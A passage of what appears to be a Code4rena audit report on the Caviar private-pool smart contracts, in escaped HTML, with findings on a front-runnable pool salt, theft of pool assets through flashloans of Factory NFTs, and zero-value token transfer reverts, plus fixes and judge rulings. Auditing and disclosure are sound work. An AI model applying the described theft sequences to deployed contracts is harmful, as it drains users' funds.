9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider making the upcoming pool address user specific by combining the salt value with user’s address.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePoolImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cloneDeterministic</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">seender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_salt</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )));</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1520013903\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/9\">https://github.com/outdoteth/caviar-private-pools/pull/9</a></p>\n<p>The proposed fix is to include the msg.sender in the salt of the proxy deployment:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// deploy a minimal proxy clone of the private pool implementation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_salt</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePoolImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk11\">cloneDeterministic</span><span class=\"mtk1\">(</span><span class=\"mtk12\">salt</span><span class=\"mtk1\">)));</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1527415720\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This boils down to whether we think a front-run is possible / reasonable.<br>\nAnd whether the griefing can be considered protracted in time.</p>\n<p>I have already judged similar issues, so I’ll link those here and share my thoughts</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1528974537\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Per my comments on a similar issue: <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/182\">#182</a></p>\n<p>I believe that the DOS is possible and fairly easy to achieve, however, there are ways to sidestep it</p>\n<p>By creating a new pool with new <code>salt</code>s it’s possible to prevent the DOS, the NFT can then be transferred to the intended owner</p>\n<p>For this reason am downgrading to Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419#issuecomment-1528974717\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>For context, if pool weren’t transferable then the DOS would have been permanent and I would have raised severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-prohibition-to-create-private-pools-with-the-factory-nft\" style=\"position:relative;\"><a href=\"#m-12-prohibition-to-create-private-pools-with-the-factory-nft\" aria-label=\"m 12 prohibition to create private pools with the factory nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/353\">[M-12] Prohibition to create private pools with the factory NFT</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/353\">hihen</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/553\">tanh</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L157\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L157</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L37\">Factory NFTs</a> deposited into a Factory-PrivatePool can have all assets in the corresponding PrivatePools stolen by malicious users.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Suppose there are two PrivatePools p1 and p2, <code>p1.nft = address(Factory)</code>, and <code>uint256(p1)</code> and <code>uint256(p2)</code> are deposited into p1.<br>\nMalicious users can use <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623\">flashloan()</a> to steal all the base tokens in p1 and p2:</p>\n<ol>\n<li>Call <code>p1.flashloan()</code> to borrow the Factory NFT - <code>uint256(p1)</code> from p1.</li>\n<li>In the flashloan callback, call <code>p1.withdraw()</code> to withdraw all the base tokens and the factory NFT - <code>uint256(p2)</code> from p1.</li>\n<li>Return <code>uint256(p1)</code> to p1.</li>\n</ol>\n<p>Suppose there are two PrivatePools p1 and p2, <code>p1.nft = address(Factory)</code>, and <code>uint256(p2)</code> is deposited into p1.<br>\nMalicious users can use <a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L623\">flashloan()</a> to steal all the base tokens and NFTs in p2:</p>\n<ol>\n<li>Call <code>p1.flashloan()</code> to borrow factory NFT - <code>uint256(p2)</code> from p1.</li>\n<li>In the flashloan callback, call <code>p2.withdraw()</code> to steal all the base tokens and NFTs in p2.</li>\n<li>Return <code>uint256(p2)</code> to p1.</li>\n</ol>\n<p>In addition, malicious users can also steal assets in p2 by:</p>\n<ol>\n<li><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L211\"><code>p1.buy(uint256(p2))</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L514\"><code>p2.withdraw(...)</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L301\"><code>p1.sell(uint256(p2)</code></a>.</li>\n</ol>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-14\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-14\" aria-label=\"recommended mitigation steps 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To prevent users from misusing the protocol and causing financial losses, we should prohibit the creation of PrivatePools with the Factory NFT:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/src/PrivatePool.sol b/src/PrivatePool.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 75991e1..14ec386 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/src/PrivatePool.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/src/PrivatePool.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -171,6 +171,8 @@ contract PrivatePool is ERC721TokenReceiver {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // check that the fee rate is less than 50%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         if (_feeRate &gt; 5_000) revert FeeRateTooHigh();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        require(_nft != factory, &quot;Unsupported NFT&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // set the state variables</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         baseToken = _baseToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         nft = _nft;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1520543927\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/14\">https://github.com/outdoteth/caviar-private-pools/pull/14</a></p>\n<p>Proposed fix is to add a check that ensures that the nft which is used in the private pool is not a private pool NFT from the factory contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// check that the nft is not a private pool NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_nft</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PrivatePoolNftNotSupported</span><span class=\"mtk1\">();</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1528975099\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Judging severity on this finding is contingent on determining if using the <code>factory</code> as NFT is an external requirement or not</p>\n<p>Will seek advice from another Judge, but saying “if they do it, they lose everything” doesn’t sound like an external requirement</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/353#issuecomment-1534397831\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>After further thinking, I believe the finding has shown a vulnerability in how the pool may be used for composability.</p>\n<p>I believe that similar “vault like” NFTs may be subject to the same risks, there’s another audit happening at this time that may also be subject to the same risk.</p>\n<p>Those instances would mostly be categorized as Medium Severity, because the implementations are not known.</p>\n<p>After discussing with additional judges, given that there are a category of NFTs that should not be Flashloaned (e.g. UniV3, Factory, other factories, etc..) believe it is most appropriate to judge the finding as Medium Severity, with the additional warning that similar “vault like” NFTs should also be examined with care.</p>\n<p>The risk doesn’t apply to ordinary collections.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-transaction-revert-if-the-basetoken-does-not-support-0-value-transfer-when-charging-changefee\" style=\"position:relative;\"><a href=\"#m-13-transaction-revert-if-the-basetoken-does-not-support-0-value-transfer-when-charging-changefee\" aria-label=\"m 13 transaction revert if the basetoken does not support 0 value transfer when charging changefee permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/278\">[M-13] Transaction revert if the <code>baseToken</code> does not support 0 value transfer when charging <code>changeFee</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/278\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/988\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/771\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/634\">jpserrat</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/533\">0xLanterns</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/238\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L423\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L423</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L651\">https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePool.sol#L651</a></p>\n<p>When call change via the PrivatePool.sol, the caller needs to the pay the change fee,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// calculate the fee amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">inputWeightSum</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// ~~~ Interactions ~~~ //</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// transfer the fee amount of base tokens from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">feeAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t);</span></span></span></code></pre>\n<p>calling changeFeeQuote(inputWeightSum)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t: </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t(</span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>if the feeAmount is 0,</p>\n<p>the code below would revert if the ERC20 token does not support 0 value transfer</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">feeAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>According to <a href=\"https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\">https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers</a></p>\n<blockquote>\n<p>Some tokens (e.g. LEND) revert when transferring a zero value amount.</p>\n</blockquote>\n<p>Same issue happens when charging the flashloan fee</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashLoan</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC3156FlashBorrower</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the NFT is available for a flash loan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">availableForFlashLoan</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAvailableForFlashLoan</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 